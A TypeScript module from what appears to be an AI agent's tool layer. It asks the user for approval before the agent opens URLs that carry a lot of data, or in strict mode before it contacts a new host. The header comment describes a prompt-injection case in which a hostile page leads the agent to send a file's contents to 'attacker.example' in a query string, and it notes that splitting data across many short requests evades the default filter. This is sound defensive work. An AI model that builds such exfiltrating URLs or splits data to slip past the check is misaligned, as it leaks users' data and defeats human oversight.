import {
  requireApproval,
  type DangerousToolOptions,
} from "../../../approval/dangerous-tool.js";
import type { UrlDataGuardMode } from "../../../config/index.js";
import { maskUrlSecrets } from "./http-request-preview.js";

/**
 * Data sent out in a URL (ATO-1377).
 *
 * A request that only reads (a GET, a page the browser opens) can still
 * carry what the agent read somewhere else: a hostile page asks for
 * `https://attacker.example/?d=<the file you just read>`, and the text
 * leaves in the address. Secret-looking values are masked before the
 * model sees them, but plain file text, a mail or a password the person
 * typed in the chat are not. A POST already asks as `http_write`; this
 * makes such a GET ask the same way.
 *
 * Modes (`http.urlDataGuard`, as decided on ATO-1377):
 *  - `"data"` (default): the cheap filter. Asks only when the address
 *    carries a lot of data (`findUrlData`). Ordinary searches and links
 *    stay quiet. It can be dodged by splitting the data over many short
 *    requests; `"strict"` is for people who want that closed too.
 *  - `"strict"`: also asks once per site per chat, before the first
 *    request to a host the chat has not used yet (the same rule the
 *    user's own Chrome follows, `user-profile-sites.ts`). A data-carrying
 *    address still asks on a site the chat already used.
 *  - `"off"`: no check (the behaviour before ATO-1377).
 *
 * Applied by `os.web.fetch`, `os.http.request` (GET) and every browser
 * tool that opens a URL (`gate-browser-url.ts`).
 */
export type { UrlDataGuardMode };

export const DEFAULT_URL_DATA_GUARD: UrlDataGuardMode = "data";

/**
 * Thresholds of the cheap filter, counted on the percent-decoded text.
 *
 * There is no published threshold to copy from comparable agents, so they follow
 * the usual DLP / DNS-exfiltration heuristics (long fields, long
 * encoded-looking runs, multi-line values) set above what ordinary
 * addresses carry: a search query typed by a person is well under 200
 * characters and product and article slugs are under 200. Ad and
 * analytics ids (`TRACKING_PARAMS`) can be long encoded runs, so they are
 * left out of that one check.
 */
/** One query / fragment value. */
export const MAX_URL_VALUE_CHARS = 200;
/** The whole query plus fragment. */
export const MAX_URL_TAIL_CHARS = 400;
/** One path segment. */
export const MAX_URL_SEGMENT_CHARS = 200;
/** A base64 / hex looking run with no spaces. */
export const MIN_URL_BLOB_CHARS = 100;

/**
 * Ad and analytics ids that are long encoded runs by design. Their value
 * is skipped by the encoded-run check only; the length limits still apply.
 */
const TRACKING_PARAMS: ReadonlySet<string> = new Set([
  "gclid",
  "gbraid",
  "wbraid",
  "dclid",
  "fbclid",
  "msclkid",
  "yclid",
  "ttclid",
  "mc_eid",
  "_ga",
  "_gl",
  "gs_lcrp",
  "ved",
  "ei",
]);

const BLOB_RE = /[A-Za-z0-9+/_-]{100,}={0,2}/;

export interface UrlDataFinding {
  /** Plain words for the approval prompt. */
  reason: string;
  /** Decoded characters the address carries in its query, fragment and path. */
  chars: number;
}

function decode(text: string): string {
  try {
    return decodeURIComponent(text.replace(/\+/g, " "));
  } catch {
    return text;
  }
}

function looksLikeBlob(value: string): boolean {
  const match = BLOB_RE.exec(value);
  if (match === null) return false;
  // Pure letters (a long word, a slug with no separators) is not an
  // encoding; base64 and hex mix digits in.
  return /\d/.test(match[0]) && /[A-Za-z]/.test(match[0]);
}

function splitParams(text: string): Array<{ name: string; value: string }> {
  if (text === "") return [];
  return text.split("&").map((pair) => {
    const eq = pair.indexOf("=");
    return eq === -1
      ? { name: "", value: decode(pair) }
      : { name: decode(pair.slice(0, eq)).toLowerCase(), value: decode(pair.slice(eq + 1)) };
  });
}

/**
 * Whether `url` carries a lot of data in its address, and why. `null`
 * for an ordinary address, a non-http(s) URL, or one that does not parse.
 */
export function findUrlData(url: string): UrlDataFinding | null {
  let parsed: URL;
  try {
    parsed = new URL(url.trim());
  } catch {
    return null;
  }
  if (parsed.protocol !== "http:" && parsed.protocol !== "https:") return null;
  const query = parsed.search.startsWith("?") ? parsed.search.slice(1) : parsed.search;
  const fragment = parsed.hash.startsWith("#") ? parsed.hash.slice(1) : parsed.hash;
  const params = [...splitParams(query), ...splitParams(fragment)];
  const segments = parsed.pathname.split("/").filter((s) => s !== "").map(decode);
  const tailChars = decode(query).length + decode(fragment).length;
  const chars = tailChars + segments.reduce((sum, s) => sum + s.length, 0);

  for (const { name, value } of params) {
    if (/[\r\n]/.test(value)) {
      return { reason: "the address carries text with line breaks", chars };
    }
    if (value.length > MAX_URL_VALUE_CHARS) {
      return { reason: `one value in the address is ${value.length} characters long`, chars };
    }
    if (!TRACKING_PARAMS.has(name) && !name.startsWith("utm_") && looksLikeBlob(value)) {
      return { reason: "the address carries a long encoded value", chars };
    }
  }
  if (tailChars > MAX_URL_TAIL_CHARS) {
    return { reason: `the address carries ${tailChars} characters after "?"`, chars };
  }
  for (const segment of segments) {
    if (/[\r\n]/.test(segment)) {
      return { reason: "the address carries text with line breaks", chars };
    }
    if (segment.length > MAX_URL_SEGMENT_CHARS) {
      return { reason: `one part of the address path is ${segment.length} characters long`, chars };
    }
    if (looksLikeBlob(segment)) {
      return { reason: "the address path carries a long encoded value", chars };
    }
  }
  return null;
}

/**
 * Hosts each chat already sent a request to under `"strict"`. Shared by
 * `os.web.fetch`, `os.http.request` and the browser, so a site cleared
 * for one is cleared for the others in the same chat.
 */
export class UrlSendSites {
  private readonly bySession = new Map<string, Set<string>>();

  has(sessionId: string, host: string): boolean {
    return this.bySession.get(sessionId)?.has(host.toLowerCase()) ?? false;
  }

  add(sessionId: string, host: string): void {
    const hosts = this.bySession.get(sessionId) ?? new Set<string>();
    hosts.add(host.toLowerCase());
    this.bySession.set(sessionId, hosts);
  }
}

/** The process-wide store the tools use unless a test hands them their own. */
export const SHARED_URL_SEND_SITES = new UrlSendSites();

/** Why a URL must ask first, or nothing to ask. */
export type UrlSendCheck =
  | { kind: "data"; host: string; origin: string; reason: string }
  | { kind: "new_site"; host: string; origin: string; reason: string };

/**
 * Pure verdict for one URL in one chat. `null`: go ahead without asking.
 */
export function checkUrlSend(
  mode: UrlDataGuardMode,
  url: string,
  sessionId: string,
  sites: UrlSendSites = SHARED_URL_SEND_SITES,
): UrlSendCheck | null {
  if (mode === "off") return null;
  let parsed: URL;
  try {
    parsed = new URL(url.trim());
  } catch {
    return null;
  }
  if (parsed.protocol !== "http:" && parsed.protocol !== "https:") return null;
  const host = parsed.hostname.toLowerCase();
  const origin = parsed.origin;
  const data = findUrlData(url);
  if (data !== null) return { kind: "data", host, origin, reason: data.reason };
  if (mode === "strict" && !sites.has(sessionId, host)) {
    return { kind: "new_site", host, origin, reason: `first request to ${host} in this chat` };
  }
  return null;
}

/** Remember an answered `"strict"` site for the chat. */
export function noteUrlSendAllowed(
  check: UrlSendCheck,
  sessionId: string,
  sites: UrlSendSites = SHARED_URL_SEND_SITES,
): void {
  sites.add(sessionId, check.host);
}

/**
 * Ask before `tool` sends `url`, when `checkUrlSend` says so. Asks as
 * `http_write`, the category a POST asks under: silent from approval
 * level 4, and an `http` grant or rule never answers it. "Allow for
 * this chat" covers that origin only (`grantKey`). Throws
 * `ApprovalDeniedError` on a no; returns whether it asked.
 */
export async function requireUrlSendApproval(
  dangerous: DangerousToolOptions,
  input: {
    mode: UrlDataGuardMode;
    tool: string;
    url: string;
    sessionId: string;
    signal: AbortSignal;
    sites?: UrlSendSites;
  },
): Promise<boolean> {
  const sites = input.sites ?? SHARED_URL_SEND_SITES;
  const check = checkUrlSend(input.mode, input.url, input.sessionId, sites);
  if (check === null) return false;
  const shown = maskUrlSecrets(input.url);
  await requireApproval(
    dangerous,
    {
      sessionId: input.sessionId,
      tool: input.tool,
      category: "http_write",
      reason: urlSendReason(shown, check),
      preview: shown,
      affectedResources: [check.host],
      grantKey: check.origin,
    },
    input.signal,
  );
  noteUrlSendAllowed(check, input.sessionId, sites);
  return true;
}

/** The prompt's reason line for a URL check. */
export function urlSendReason(shownUrl: string, check: UrlSendCheck): string {
  return check.kind === "data"
    ? `open ${shownUrl}: ${check.reason}, which may send data from this chat to ${check.host}`
    : `open ${shownUrl}: ${check.reason} (http.urlDataGuard is "strict")`;
}
